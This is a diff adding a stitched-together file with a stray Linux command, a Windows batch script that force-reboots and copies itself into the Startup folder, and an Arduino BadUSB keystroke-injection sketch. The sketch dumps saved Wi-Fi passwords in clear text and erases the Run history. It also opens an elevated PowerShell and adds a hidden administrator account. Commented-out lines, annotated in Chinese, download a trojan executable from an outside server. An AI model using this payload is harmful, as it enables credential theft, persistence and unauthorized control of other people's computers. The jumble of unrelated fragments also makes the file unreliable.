@@ -1,0 +1,141 @@
+ps -e | grep apt
+@echo off
+time 0.0
+shutdown -r -t 1 -f
+copy a.bat "C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\b.bat"
+cls
+del a.bat
+#include <Keyboard.h>
+
+void setup() {
+
+Keyboard.begin();
+
+delay(500);
+
+Keyboard.press(KEY_LEFT_GUI);
+
+delay(5);
+
+Keyboard.press('r');
+
+delay(500);
+
+Keyboard.release(KEY_LEFT_GUI);
+
+delay(5);
+Keyboard.release('r');
+
+delay(500); 
+
+Keyboard.press(KEY_CAPS_LOCK);
+
+Keyboard.release(KEY_CAPS_LOCK);
+
+delay(500);
+
+Keyboard.println("CMD");
+
+Keyboard.press(KEY_RETURN);
+
+Keyboard.release(KEY_RETURN);
+
+delay(500);
+
+Keyboard.print(F("for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> d:/wifi.txt"));
+
+Keyboard.press(KEY_RETURN);
+
+Keyboard.release(KEY_RETURN);
+
+delay(500);
+
+Keyboard.print(F("netsh wlan show networks mode=bssid >> d:/wifi-bssid.txt"));
+
+Keyboard.press(KEY_RETURN);
+
+Keyboard.release(KEY_RETURN);
+
+delay(500);
+
+Keyboard.println("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f"); /*清除运行窗口产生的记录*/
+
+delay(500);
+
+Keyboard.println("cmd.exe /T:03 /K mode CON: COLS=16 LINES=1"); //让cmd窗口变成一个很小的窗口
+
+delay(500);
+
+//Keyboard.press(KEY_CAPS_LOCK);
+
+//Keyboard.release(KEY_CAPS_LOCK);
+
+//delay(500); 
+
+//Keyboard.println("$P = new-object system.net.webslient"); //利用powershell 定义一个对象
+
+//delay(500);
+
+//Keyboard.println("$P.dowloadfile('HTTP://www.xrbbm.xyz:90/show/test.exe','c:\\test.exe')");  /*从服务端下载病毒 服务器地址和木马自己指定 还有木马将在目标机上存放的地址 自己设置*/
+
+//delay(500);
+
+Keyboard.println("powershell.exe -command start-process powershell -verb runAs");  /*开启管理员级别的powershell*/
+
+delay(2500);
+
+Keyboard.press(KEY_LEFT_ARROW); //按住左方向键
+
+delay(500);
+
+Keyboard.release(KEY_LEFT_ARROW); //释放左方向键
+
+delay(500);
+
+Keyboard.press(KEY_RETURN); //按下回车键
+
+delay(500);
+
+Keyboard.release(KEY_RETURN);//释放enter键
+
+delay(500);
+
+Keyboard.print(F("net user anonymous hacker /add"));
+
+Keyboard.press(KEY_RETURN);
+
+Keyboard.release(KEY_RETURN);
+
+delay(500);
+
+Keyboard.print(F("net localgroup administrators anonymous /add"));
+
+Keyboard.press(KEY_RETURN);
+
+Keyboard.release(KEY_RETURN);
+
+delay(1000);  
+
+delay(500);
+
+Keyboard.print(F("exit"));
+
+Keyboard.press(KEY_RETURN);
+
+Keyboard.release(KEY_RETURN);
+
+delay(500);
+
+Keyboard.press(KEY_CAPS_LOCK);
+
+Keyboard.release(KEY_CAPS_LOCK);
+
+delay(500);
+
+Keyboard.end();
+
+}
+
+void loop()
+
+{}
